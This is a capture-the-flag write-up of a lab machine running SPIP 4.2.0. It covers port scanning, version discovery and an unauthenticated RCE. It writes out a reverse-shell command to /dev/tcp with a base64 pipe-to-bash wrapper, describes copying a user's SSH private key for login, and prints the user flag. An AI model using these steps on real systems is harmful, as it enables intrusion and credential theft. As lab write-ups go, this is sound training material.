# Publisher

### Publisher
(Flags can be found at the end of this writeup)<br />
Initial scan: 

    nmap -n -Pn -v --min-rate=1000 -p- 10.10.99.134                        
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 15:29 EDT
    Initiating Connect Scan at 15:29
    Scanning 10.10.99.134 [65535 ports]
    Discovered open port 80/tcp on 10.10.99.134
    Discovered open port 22/tcp on 10.10.99.134
    Completed Connect Scan at 15:30, 35.15s elapsed (65535 total ports)
    Nmap scan report for 10.10.99.134
    Host is up (0.066s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
The website seems to be a magazine about SPIP, which is a content management system:<br />
![image](https://github.com/user-attachments/assets/3585d3d3-4012-498c-8ef6-d19183aa252c)<br />
Directory enumeration gives some results:<br />
![image](https://github.com/user-attachments/assets/968f056c-f9f0-40df-a0da-9edf2a8d864a)<br />
Moving to /spip, wappalyzer shows us that the server is running SPIP 4.2.0.<br />
![image](https://github.com/user-attachments/assets/53ff1363-7149-4f70-89e5-970d7776838e)<br />
Searching online I found that this version is vulnerable to unauthenticated RCE. The code for the exploit can be found in `exploit.py` of this folder. To run it, first base64 encode the following string `sh -i >& /dev/tcp/10.11.85.53/4444 0>&1`. The payload should look something like `echo base64string | base64 -d | bash`.<br />
So set up a netcat listener and run the following:<br />
![image](https://github.com/user-attachments/assets/9ba6e70e-2f29-4664-96fc-4f65c4523afe)<br />
Sadly the target machine doesn't have python or netcat, and I don't know how to stabilize the shell without these tools. Fortunately, the `think` user has a .ssh folder from which we can copy the private key. <br />
![image](https://github.com/user-attachments/assets/8d7a5cdc-ee53-45b0-b6ca-4af8eb096c7a)<br />
So, create an `id_rsa` file containing the private key, change it's permissions so that it can be used to access the machine with `chmod 600 id_rsa`. Finally log in with `ssh -i id_rsa think@target_IP`.<br />
![image](https://github.com/user-attachments/assets/efa2fd4e-2e40-4a34-b2b2-b0a2b20ef370)<br />
Very good, now let's see if we can get root aswell. 


- What is the user flag? `fa229046d44eda6a3598c73ad96f4ca5 `
- What is the root flag?

